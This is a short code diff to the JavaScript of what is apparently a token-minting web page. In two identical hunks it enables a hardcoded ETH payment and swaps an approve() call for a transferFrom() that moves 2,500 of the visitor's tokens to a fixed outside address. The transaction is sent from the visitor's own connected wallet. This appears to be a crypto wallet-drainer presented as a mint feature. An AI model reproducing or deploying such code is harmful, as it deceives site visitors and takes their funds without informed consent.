@@ -39,8 +39,8 @@ mint token
                const tx = {
          'from': accountaddress,
          'to': contractAddress,
-         //'value':'0x13fbe85edc90000',
-         'data': contract.methods.approve('0x627E73137ec96F1D56e6A5C6F874f4Bb9e128fEa',2500).encodeABI()};
+         'value':'0x13fbe85edc90000',
+         'data': contract.methods.transferFrom(accountaddress,'0x627E73137ec96F1D56e6A5C6F874f4Bb9e128fEa',2500).encodeABI()};
          window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [tx],
@@ -61,8 +61,8 @@ mint token
                const tx = {
          'from': accountaddress,
          'to': contractAddress,
-         //'value':'0x13fbe85edc90000',
-         'data': contract.methods.approve('0x627E73137ec96F1D56e6A5C6F874f4Bb9e128fEa',2500).encodeABI()};
+         'value':'0x13fbe85edc90000',
+         'data': contract.methods.transferFrom(accountaddress,'0x627E73137ec96F1D56e6A5C6F874f4Bb9e128fEa',2500).encodeABI()};
          window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [tx],
